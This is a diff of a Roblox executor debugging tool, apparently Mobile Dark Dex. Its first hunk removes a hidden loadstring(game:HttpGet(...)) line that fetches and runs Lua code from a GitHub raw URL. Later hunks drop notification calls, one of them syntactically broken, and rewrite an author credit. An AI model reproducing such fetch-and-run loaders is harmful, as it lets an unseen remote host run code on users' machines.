@@ -8,10 +8,6 @@
 	Dex is a debugging suite designed to help the user debug games and find any potential vulnerabilities.
 ]]
 
-getgenv().PKJ = "b" 
-getgenv().SJJs = "rb" 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/tes.lua"))()
-
 local nodes = {}
 local selection
 local cloneref = cloneref or function(...) return ... end
@@ -4250,12 +4246,6 @@ local EmbeddedModules = {
 				copy.MouseButton1Click:Connect(function()
 					local source = codeFrame:GetText()
 					env.setclipboard(source)
-					Library:CreateNotification(
-            "Mobile Dark Dex",
-            "Script had been copied into clipboard",
-            3,
-            {"Alright", "Thanks"}
-        )
 				end)
 
 				local save = Instance.new("TextButton",window.GuiElems.Content)
@@ -4272,7 +4262,6 @@ local gameName = marketplace:GetProductInfo(game.PlaceId).Name:gsub("[%c%p]", "_
 local filename = gameName .. "_Script_" .. os.time() .. ".lua"
 
 					env.writefile(filename, source)
-					            Library:CreateNotification("Mobile Dark Dex", "Saved as " .. fileName .. ", 5, {"Alright", "Thanks"})
 					if env.movefileas then
 						env.movefileas(filename, ".txt")
 					end
@@ -4293,7 +4282,7 @@ local filename = gameName .. "_Script_" .. os.time() .. ".lua"
 							local getupvalues = (debug and debug.getupvalues) or getupvalues or getupvals
 							local getconstants = (debug and debug.getconstants) or getconstants or getconsts
 							local getinfo = (debug and (debug.getinfo or debug.info)) or getinfo
-							local original = ("\n-- // Function Dumper made by unknown\n-- // Script Path: %s\n\n--[["):format(PreviousScr:GetFullName())
+							local original = ("\n-- // Function Dumper made by King.Kevin\n-- // Script Path: %s\n\n--[["):format(PreviousScr:GetFullName())
 							local dump = original
 							local functions, function_count, data_base = {}, 0, {}
 							function functions:add_to_dump(str, indentation, new_line)
